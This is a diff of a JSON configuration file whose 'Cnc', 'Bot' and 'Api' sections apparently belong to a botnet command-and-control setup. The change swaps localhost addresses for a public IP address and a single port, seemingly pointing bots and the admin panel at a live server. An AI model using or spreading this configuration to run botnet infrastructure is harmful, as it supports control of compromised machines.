@@ -1,16 +1,16 @@
 {
 	"Cnc": {
-		"Server": "127.0.0.1",
-		"Port": "1234",
+		"Server": "128.116.77.158",
+		"Port": "64406",
 		"AdmLogin": "root"
 	},
 	"Bot": {
-		"Server": "127.0.0.1",
-		"Port": "9999"
+		"Server": "128.116.77.158",
+		"Port": "64406"
 	},
 	"Api": {
-		"Server": "127.0.0.1",
-		"Port": "1339",
+		"Server": "128.116.77.158",
+		"Port": "64406",
 		"CustomPathEnabled": false,
 		"CustomPath": "/path"
 	},
